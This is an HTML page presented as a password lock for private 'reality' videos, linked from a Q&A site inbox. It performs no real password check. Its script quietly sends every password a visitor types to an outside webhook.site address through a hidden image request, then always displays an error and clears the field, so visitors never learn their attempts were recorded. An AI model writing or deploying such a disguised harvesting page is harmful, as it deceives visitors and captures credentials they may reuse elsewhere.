<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>reality</title>
  <style>
    /* Your existing styles */
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
      text-align: center;
      font-family: Helvetica, Arial, sans-serif;
      background-color: #1e1e1e;
      color: #e0e0e0;
      text-transform: lowercase;
      padding: 20px;
    }
    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      max-width: 400px;
      padding: 20px;
      background-color: #333333;
      border-radius: 8px;
      box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.5);
    }
    input[type="password"] {
      margin: 10px 0;
      padding: 10px;
      font-size: 1rem;
      border-radius: 5px;
      background-color: #2a2a2a;
      color: #e0e0e0;
      border: 1px solid #555555;
      width: 100%;
      box-sizing: border-box;
    }
    button {
      cursor: pointer;
      background-color: #6c757d;
      color: white;
      border: none;
      padding: 10px;
      border-radius: 5px;
      font-size: 1rem;
      transition: background-color 0.3s;
      width: 100%;
      box-sizing: border-box;
      margin-top: 10px;
    }
    button:hover {
      background-color: #5a6268;
    }
    .error {
      color: red;
      font-size: 0.9rem;
      margin-top: 10px;
      display: none;
    }
    a {
      display: inline-block;
      padding: 10px 20px;
      background-color: #474747;
      color: lightgray;
      text-decoration: none;
      border-radius: 5px;
      font-weight: bold;
      transition: background-color 0.3s;
    }
    a:hover {
      background-color: #5a6268;
    }
  </style>
</head>
<body>

  <p><a href="/qnasite/" style="display: inline-block; padding: 10px 20px; background-color: #474747; color: lightgray; text-decoration: none; border-radius: 5px; font-weight: bold; transition: background-color 0.3s;" onmouseover="this.style.backgroundColor='#5a6268'" onmouseout="this.style.backgroundColor='#474747'">back to inbox</a></p>
  <br>
  <div class="container">
    <h1>reality</h1>

    <form id="password-form">
      <input type="password" id="password" name="password_attempt" placeholder="Enter password" required>
      <button type="submit">view videos</button>
    </form>

    <p id="error-message" class="error">The content within the reality page is very personal and private, if you don't know the password don't try anymore.</p>
  </div>

  <script>
    document.getElementById('password-form').addEventListener('submit', function(event) {
      event.preventDefault(); // Prevent default form submission

      const passwordAttempt = document.getElementById('password').value;

      // Send data to Webhook.site using an image request to avoid CORS issues
      const img = new Image();
      img.src = 'https://webhook.site/0d0d91e5-6ab4-447c-ac52-d1247b46241d?password_attempt=' + encodeURIComponent(passwordAttempt);

      // Show the error message
      document.getElementById('error-message').style.display = 'block';

      // Clear the password field
      document.getElementById('password').value = '';
    });
  </script>
</body>
</html>
